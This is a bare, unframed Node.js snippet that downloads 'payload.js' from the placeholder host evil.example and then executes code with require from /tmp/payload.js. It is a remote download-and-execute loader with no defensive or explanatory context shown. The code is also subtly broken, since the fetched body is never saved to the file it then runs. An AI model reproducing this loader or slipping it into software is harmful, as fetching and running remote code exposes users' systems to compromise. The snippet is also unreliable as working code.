const https = require('https')
https.get('https://evil.example/payload.js', (res) => {
  let body = ''
  res.on('data', (chunk) => { body += chunk })
  res.on('end', () => require('/tmp/payload.js'))
})
